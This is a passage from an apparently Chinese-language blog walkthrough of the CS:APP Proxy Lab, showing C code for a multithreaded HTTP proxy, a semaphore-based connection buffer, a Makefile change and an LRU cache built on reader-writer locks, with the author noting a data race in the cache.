class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; ++i) &#123;	<span class="comment">// 创建 NTHREADS 个线程，线程例程为 thread</span></span><br><span class="line">    	Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">    	sbuf_insert(&amp;sbuf, connfd);	<span class="comment">// 将得到的和客户端连接的描述符插入到缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE], filename[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    </span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE); <span class="comment">// 读取请求行</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;	<span class="comment">// 只能处理 GET 方法</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    parse_uri(uri, hostname, port, filename);	<span class="comment">// 解析 uri</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> requesthdrs[MAXLINE];</span><br><span class="line">    build_requesthdrs(&amp;rio, requesthdrs, filename, hostname);	<span class="comment">// 构建请求行和请求报头</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> severfd = Open_clientfd(hostname, port);	<span class="comment">// 得到和服务器连接的描述符</span></span><br><span class="line">    <span class="keyword">if</span> (severfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;connection faild\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Rio_writen(severfd, requesthdrs, <span class="built_in">strlen</span>(requesthdrs));	<span class="comment">// 将请求行和请求报头发送给服务器</span></span><br><span class="line">    </span><br><span class="line">    echo(severfd, fd);	<span class="comment">// 处理服务器的响应</span></span><br><span class="line">    </span><br><span class="line">    Close(severfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr_h;</span><br><span class="line">    <span class="keyword">if</span> ((ptr_h = <span class="built_in">strstr</span>(uri, <span class="string">&quot;//&quot;</span>))) &#123; <span class="comment">// 有 hostname</span></span><br><span class="line">    	<span class="type">char</span> *ptr_p;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> ((ptr_p = index(ptr_h, <span class="string">&#x27;:&#x27;</span>))) &#123; <span class="comment">// 有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_p, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(port, ptr_p + <span class="number">1</span>);</span><br><span class="line">    	    *ptr_p = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>); </span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 没有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_h + <span class="number">2</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 没有 hostname，也没有 port</span></span><br><span class="line">    	<span class="built_in">strcpy</span>(filename, uri);</span><br><span class="line">    	<span class="built_in">strcpy</span>(hostname, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    	<span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], host_hdrs[MAXLINE], other_hdrs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> *conn_hdrs = <span class="string">&quot;Connection: close\r\n&quot;</span>, *proxy_hdrs = <span class="string">&quot;Proxy-Connection: close\r\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, filename); <span class="comment">// 请求行</span></span><br><span class="line">    </span><br><span class="line">    Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 请求报头</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;\r\n&quot;</span>)) &#123;	<span class="comment">// 还没有读到空行</span></span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;Host&quot;</span>)) &#123;	<span class="comment">// 读到 Host 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(host_hdrs, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strstr</span>(buf, <span class="string">&quot;User-Agent&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Connection&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Proxy&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 不是 user、connection、proxy 报头就追加到 other 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(other_hdrs + <span class="built_in">strlen</span>(other_hdrs), <span class="string">&quot;%s&quot;</span>, buf);	</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(host_hdrs) == <span class="number">0</span>) &#123;	<span class="comment">// 没有读到 Host 报头，则一定在 uri 中</span></span><br><span class="line">    	    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;Host: %s\r\n&quot;</span>, hostname);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 别忘了添加空行</span></span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;%s%s%s%s\r\n&quot;</span>, user_agent_hdr, conn_hdrs, proxy_hdrs, other_hdrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    Rio_readinitb(&amp;rio, severfd);</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">    	Rio_writen(clientfd, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sbuf.c</strong> 代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sbuf.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    sp-&gt;buf = Calloc(n, <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">// 分配缓冲区且初始化为 0</span></span><br><span class="line">    sp-&gt;n = n;							<span class="comment">// 缓冲区的最大容量 </span></span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;			<span class="comment">// 缓冲区中有效位的起始和终止下标，初始为 0</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>); 		<span class="comment">// 互斥锁，初始为 1</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;slots, <span class="number">0</span>, n); 		<span class="comment">// 记录缓冲区中空位数，初始为 n</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;items, <span class="number">0</span>, <span class="number">0</span>); 		<span class="comment">// 记录缓冲区中有效位数，初始为 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Free(sp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;sp-&gt;slots);			<span class="comment">// 是否有空位，有的话空位 - 1</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);			<span class="comment">// 上锁</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item; <span class="comment">// 还是一个循环数组</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);			<span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;items);			<span class="comment">// 有效位 + 1，唤醒等待有效位的 P </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);			<span class="comment">// 是否有有效位，有的话有效位 - 1</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);			<span class="comment">// 上锁</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)];	</span><br><span class="line">    V(&amp;sp-&gt;mutex);			<span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;slots);			<span class="comment">// 空位 + 1，唤醒等待空位的 P</span></span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sbuf.h</strong> 代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __SBUF_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SBUF_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> *buf; 		<span class="comment">// 缓冲区</span></span><br><span class="line">    <span class="type">int</span> n;			<span class="comment">// 缓冲区最大容量</span></span><br><span class="line">    <span class="type">int</span> front;		<span class="comment">// 有效位起始地址</span></span><br><span class="line">    <span class="type">int</span> rear;		<span class="comment">// 有效位终止地址</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;	<span class="comment">// 互斥锁</span></span><br><span class="line">    <span class="type">sem_t</span> slots;	<span class="comment">// 记录空位数的信号量</span></span><br><span class="line">    <span class="type">sem_t</span> items;	<span class="comment">// 记录有效位数的信号量</span></span><br><span class="line">&#125; <span class="type">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>在通过 <strong>make</strong> 编译程序时可能会发生错误，这是由于新增了 sbuf.c，我们需要修改 Makefile 文件，修改内容如下</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile for Proxy Lab </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You may modify this file any way you like (except for the handin</span></span><br><span class="line"><span class="comment"># rule). You instructor will type &quot;make&quot; on your specific Makefile to</span></span><br><span class="line"><span class="comment"># build your proxy from sources.</span></span><br><span class="line"></span><br><span class="line">CC = gcc</span><br><span class="line">CFLAGS = -g -Wall</span><br><span class="line">LDFLAGS = -lpthread</span><br><span class="line"></span><br><span class="line"><span class="section">all: proxy</span></span><br><span class="line"></span><br><span class="line"><span class="section">csapp.o: csapp.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c csapp.c</span><br><span class="line"></span><br><span class="line"><span class="section">sbuf.o: sbuf.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c sbuf.c</span><br><span class="line"></span><br><span class="line"><span class="section">proxy.o: proxy.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c proxy.c</span><br><span class="line"></span><br><span class="line"><span class="section">proxy:sbuf.o proxy.o csapp.o</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> proxy.o sbuf.o csapp.o -o proxy <span class="variable">$(LDFLAGS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creates a tarball in ../proxylab-handin.tar that you can then</span></span><br><span class="line"><span class="comment"># hand in. DO NOT MODIFY THIS!</span></span><br><span class="line"><span class="section">handin:</span></span><br><span class="line">	(make clean; cd ..; tar cvf <span class="variable">$(USER)</span>-proxylab-handin.tar proxylab-handout --exclude tiny --exclude nop-server.py --exclude proxy --exclude driver.sh --exclude port-for-user.pl --exclude free-port.sh --exclude <span class="string">&quot;.*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *~ *.o proxy core *.tar *.zip *.gzip *.bzip *.gz</span><br></pre></td></tr></table></figure>

<h1 id="Caching-web-objects"><a href="#Caching-web-objects" class="headerlink" title="Caching web objects"></a>Caching web objects</h1><ul>
<li>讲义中提到：多个线程必须能够同时从缓存中读取，当然，一次只允许一个线程写入缓存，但读取器不得存在此限制。因此我们明白对缓存的访问是一个典型的 <strong>读者 - 写者</strong> 模型</li>
<li>代理的缓存应采用近似于最近最少使用的 （LRU） 逐出策略的逐出策略，请注意，读取对象和写入对象都算作使用该对象</li>
</ul>
<h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><ul>
<li><p>我们定义的 cache 中有两个锁，mutex 是用来实现互斥访问共享变量 readers，readers 可以用来实现多个读者同时访问缓存；w 是用来实现读者写者互斥访问缓存的</p>
</li>
<li><p>因为我们的代理只能处理 GET 方法，所以我们可以通过请求中的 uri 来标示缓存中对应的服务器 response</p>
</li>
<li><p>由于 LRU 的驱逐政策，所以 cache_line 中有 timestamp 时间戳来帮助选择最少使用的缓存行</p>
</li>
<li><p>我们定义的 cache_line 中的 mutex 互斥锁用来实现读者互斥访问这个缓存行，由于读者的访问也需要更新时间戳，所以这种更新也是一种写，需要实现互斥访问</p>
<blockquote>
<p>之后回过头来发现没必要好像，即使有也还是存在数据竞争）</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> response[MAX_OBJECT_SIZE];	<span class="comment">// 缓冲区</span></span><br><span class="line">    <span class="type">char</span> uri[MAXLINE];				<span class="comment">// 缓存的 Web 对象对应的 HTTP 请求中的 uri</span></span><br><span class="line">    <span class="type">int</span> vaild;						<span class="comment">// 有效位</span></span><br><span class="line">    <span class="type">int</span> timestamp;					<span class="comment">// 时间戳</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;					<span class="comment">// 互斥锁</span></span><br><span class="line">&#125; cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    cache_line *buf;</span><br><span class="line">    <span class="type">int</span> n;			<span class="comment">// 最大容量</span></span><br><span class="line">    <span class="type">int</span> readers;	<span class="comment">// 正在访问缓冲区的读者数</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;	<span class="comment">// 互斥锁，互斥访问 readers</span></span><br><span class="line">    <span class="type">sem_t</span> w;		<span class="comment">// 互斥锁，互斥访问缓冲区</span></span><br><span class="line">&#125; cache;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache_init</strong> 函数初始化缓存，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cache_init</span><span class="params">(cache *cache, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    cache-&gt;buf = Malloc(n * <span class="keyword">sizeof</span>(cache_line));</span><br><span class="line">    cache-&gt;n = n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;	<span class="comment">// 设置有效位和时间戳</span></span><br><span class="line">    	cache-&gt;buf[i].vaild = <span class="number">0</span>;</span><br><span class="line">    	cache-&gt;buf[i].timestamp = <span class="number">0</span>;</span><br><span class="line">        Sem_init(&amp;cache-&gt;buf[i].mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cache-&gt;readers = <span class="number">0</span>;				<span class="comment">// 一开始没有读者</span></span><br><span class="line">    Sem_init(&amp;cache-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>);	<span class="comment">// 初始化互斥锁</span></span><br><span class="line">    Sem_init(&amp;cache-&gt;w, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache_write</strong> 函数将参数中的 uri 和对应的 response 存入缓存中，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cache_write</span><span class="params">(cache *cache, <span class="type">char</span> *uri, <span class="type">char</span> *response)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;cache-&gt;w);	<span class="comment">// 上锁</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> index = cache_insert_index(cache);	<span class="comment">// 找到缓存中合适的位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(cache-&gt;buf[index].response, response);	<span class="comment">// 存入缓存</span></span><br><span class="line">    <span class="built_in">strcpy</span>(cache-&gt;buf[index].uri, uri);</span><br><span class="line">    cache-&gt;buf[index].vaild = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;n; ++i) &#123;	<span class="comment">// 更新时间戳</span></span><br><span class="line">    	<span class="keyword">if</span> (cache-&gt;buf[i].vaild) &#123;</span><br><span class="line">    	    cache-&gt;buf[i].timestamp++;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache-&gt;buf[index].timestamp = <span class="number">0</span>;	</span><br><span class="line">    </span><br><span class="line">    V(&amp;cache-&gt;w);	<span class="comment">// 解锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache_insert_index</strong> 函数在缓存中找到合适的插入位置，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cache_insert_index</span><span class="params">(cache *cache)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;n; ++i) &#123; <span class="comment">// 是否有未使用的缓存</span></span><br><span class="line">    	<span class="keyword">if</span> (!cache-&gt;buf[i].vaild) </span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cache_LRU(cache);	<span class="comment">// 缓存满了，LRU 驱逐</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache_LRU</strong> 函数找到缓存中最少使用的缓存行的下标，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cache_LRU</span><span class="params">(cache *cache)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxtimestamp = cache-&gt;buf[<span class="number">0</span>].timestamp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; cache-&gt;n; ++i) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (cache-&gt;buf[i].timestamp &gt; maxtimestamp) &#123;</span><br><span class="line">    	    index = i;</span><br><span class="line">    	    maxtimestamp = cache-&gt;buf[i].timestamp;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache_read</strong> 函数允许多个读者同时访问缓存。通过请求的 uri 索引缓存中的 response，如果缓存命中，将索引到的 response 发送给对应的客户端并返回 1；缓存不命中则返回 0</li>
<li>更新时间戳的位置上有一个 <strong>数据竞争</strong>，当一个读者在更新一个缓存行的时间戳时，另一个读者可能正在遍历这个缓存，更新和访问的先后会对结果产生影响！这显然是一个 bug！然而该怎么改呢 ……</li>
<li>具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cache_read</span><span class="params">(cache *cache, <span class="type">int</span> fd, <span class="type">char</span> *uri)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;cache-&gt;mutex);</span><br><span class="line">    cache-&gt;readers++;</span><br><span class="line">    <span class="keyword">if</span> (cache-&gt;readers == <span class="number">1</span>)	<span class="comment">// 是否是第一个读者</span></span><br><span class="line">    	P(&amp;cache-&gt;w);</span><br><span class="line">    V(&amp;cache-&gt;mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> index, flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((index = cache_search_index(cache, uri)) != <span class="number">-1</span>) &#123;	<span class="comment">// 如果缓存命中</span></span><br><span class="line">    	Rio_writen(fd, cache-&gt;buf[index].response, <span class="built_in">strlen</span>(cache-&gt;buf[index].response));</span><br><span class="line">    	</span><br><span class="line">        P(&amp;cache-&gt;buf[index].mutex);	</span><br><span class="line">    	cache-&gt;buf[index].timestamp = <span class="number">0</span>;	<span class="comment">// 更新时间戳</span></span><br><span class="line">        V(&amp;cache-&gt;buf[index].mutex);</span><br><span class="line">    	